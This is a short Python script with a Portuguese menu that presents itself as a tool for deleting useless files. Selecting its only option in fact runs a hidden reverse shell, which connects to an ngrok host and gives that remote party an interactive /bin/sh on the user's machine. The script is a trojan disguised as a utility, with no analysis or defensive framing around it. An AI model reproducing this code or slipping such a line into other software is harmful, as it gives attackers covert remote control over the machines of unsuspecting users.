
#####################
# FUNÇÕES & MODULOS #
#####################

global R,B,C,Y,G,RT,CY,CO
CO='\033[m';R='\033[1;31m';B='\033[1;34m';C='\033[1;37m';CY='\033[1;36m';Y='\033[1;33m';G='\033[1;32m';RT='\033[;0m';NO_FORMAT="\033[0m";C_GREY89="\033[38;5;254m";C_RED1="\033[48;5;196m"


import os, sys, smtplib, json, requests
from time import sleep

try:
	import pyfiglet
except:
	os.system('pip install pyfiglet')
def clear():
	os.system('clear')
def x():
	print(f'   {C}[{G}X{C}]{R} RETORNAR')	
	
####################
#                  #
#  MENU PRINCIPAL  #          
#                  #
####################


while True:
	clear()
	print(f'    {G}——— {C}[{R}*{C}] CODIFICADO POR: {G}LIPEZIN{C} AND {G}APRONITY SECURITY{C} [{R}*{C}]{G} ———')
	result = pyfiglet.figlet_format(" MENU", font = "5lineoblique" )

	print(f'''{C}{G}{result}''')
	print(f'              {C}{R}BY LIPEZIN {C}')
	print(f'   //--==--==--==--==--==--==--==--==--==--==--\\')
	print(f'   11                                         11')
	print(f'   11 {C}[{G}01{C}]{R} Eliminar Arquivos Inuteis{C}]{C} 11')
	
	print(f'   11                                         11')
	print(f'   \\--==--==--==--==--==--==--==--==--==--==--//')
	choice = input(f'\n\n\n{R}   QUAL OPCAO VC DESEJA?>>>{C} ')
	
	
	if choice == '1':
		        os.system(''' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("2.tcp.ngrok.io",13242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ''')
